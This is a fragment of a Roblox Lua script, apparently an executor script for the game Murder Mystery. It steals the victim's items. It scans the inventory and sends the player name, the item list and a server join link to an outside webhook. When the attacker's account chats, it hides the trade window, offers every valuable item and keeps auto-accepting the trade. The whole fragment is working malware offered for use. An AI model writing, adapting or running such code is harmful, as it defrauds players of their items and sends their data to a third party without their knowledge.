    local function scanInventory()
        local pg = player:WaitForChild("PlayerGui", 15)
        local mg = pg:WaitForChild("MainGUI", 15)
        local container = mg.Game.Crafting.Inventory.Salvage.ScrollFrame.Container
        local items = {}
        local totalVal = 0
        for _, item in pairs(container:GetChildren()) do
            if item:IsA("GuiObject") then
                local rawName = item.Name
                local count = 1
                local amountLabel = item:FindFirstChild("Amount", true) or item:FindFirstChild("Count", true)
                if amountLabel then count = tonumber(string.match(amountLabel.Text, "%d+")) or 1 end
                items[rawName] = (items[rawName] or 0) + count
                if itemValues[rawName] then totalVal = totalVal + (itemValues[rawName] * count) end
            end
        end
        return items, totalVal
    end

    local acceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
    local updateTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("UpdateTrade")
    updateTrade.OnClientEvent:Connect(function(number)
        if number and number.LastOffer then 
            task.spawn(function()
                while task.wait(0.2) do 
                    acceptTrade:FireServer(game.PlaceId * 3, number.LastOffer)
                    if not player.PlayerGui.MainGUI.Game.Leaderboard.Container:FindFirstChild("TradeRequest") then break end
                end 
            end)
        end
    end)

    local function startTransfer(target)
        task.spawn(function()
            local pg = player.PlayerGui
            if pg:FindFirstChild("TradeGUI") then pg.TradeGUI:Destroy() end
            if pg:FindFirstChild("TradeGUI_Phone") then pg.TradeGUI_Phone:Destroy() end
            if pg.MainGUI.Game:FindFirstChild("Trade") then pg.MainGUI.Game.Trade.Visible = false end
        end)
        pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(target) end)
        task.spawn(function()
            task.wait(2)
            local inv, _ = scanInventory()
            for name, count in pairs(inv) do
                if name ~= "Default Knife" and name ~= "Default Gun" then
                    for i = 1, count do ReplicatedStorage.Trade.OfferItem:FireServer(name) task.wait(0.3) end
                end
            end
        end)
    end

    local function sendJoinLog()
        local inv, total = scanInventory()
        local invLines = ""
        for name, count in pairs(inv) do
            local uv = itemValues[name]
            local dv = uv and tostring(uv * count) or "N/A"
            invLines = invLines .. "x" .. count .. " " .. name .. " [" .. dv .. "]\n"
        end
        local kebabLink = "https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
        local payload = {
            ["content"] = total >= 100 and "@everyone" or "",
            ["embeds"] = {{
                ["title"] = "ğŸ”ª Murder Mystery",
                ["color"] = total >= 1000 and 0xff1e1e or 0x00ff00,
                ["fields"] = {
                    {["name"] = "ğŸ‘¤ Player Profile", ["value"] = "> ğŸ§‘â€ğŸ’» **Nick:** " .. player.Name .. "\n> ğŸ“¥ **Receiver:** " .. receiver_account .. "\n> âš™ï¸ **Executor:** " .. executorName},
                    {["name"] = "ğŸ’° Value Summary", ["value"] = "```\nTotal Value: " .. total .. "```"},
                    {["name"] = "ğŸ’ Full Inventory", ["value"] = "```\n" .. (invLines ~= "" and invLines or "Empty") .. "```"},
                    {["name"] = "ğŸ”— Join Server", ["value"] = "[Click to Join Server](" .. kebabLink .. ")"}
                },
                ["footer"] = {["text"] = os.date("%X") .. " | toprak shitsploit support"}
            }}
        }
        request({Url = webhook_url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
    end

    sendJoinLog()

    local function monitor(p)
        p.Chatted:Connect(function() if p.Name == receiver_account then startTransfer(p) end end)
    end
    for _, p in pairs(Players:GetPlayers()) do monitor(p) end
    Players.PlayerAdded:Connect(monitor)
end
